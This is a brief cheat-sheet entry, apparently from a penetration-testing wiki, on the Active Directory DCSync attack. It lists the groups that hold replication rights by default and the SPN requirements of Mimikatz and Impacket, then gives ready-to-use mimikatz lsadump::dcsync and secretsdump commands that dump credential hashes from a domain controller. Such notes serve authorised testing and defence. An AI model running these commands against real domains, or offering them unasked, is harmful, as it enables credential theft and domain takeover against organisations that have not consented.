see POST

Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts



dcsync

Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default.

In some cases, over-privileged accounts can be abused to grant controlled objects the right to dcsync

For an undocumented reason, Impacket's secretsdump relies on SMB before doing a DCSync (hence requiring a CIFS/domaincontroller SPN when using Kerberos tickets)

Mimikatz relies on LDAP before doing the DCSync (hence requiring a LDAP/domaincontroller SPN when using Kerberos tickets)






```
mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator

```

```

secretsdump '<domain>'/'<user>':'<password>'@'<domain_controller>'

```
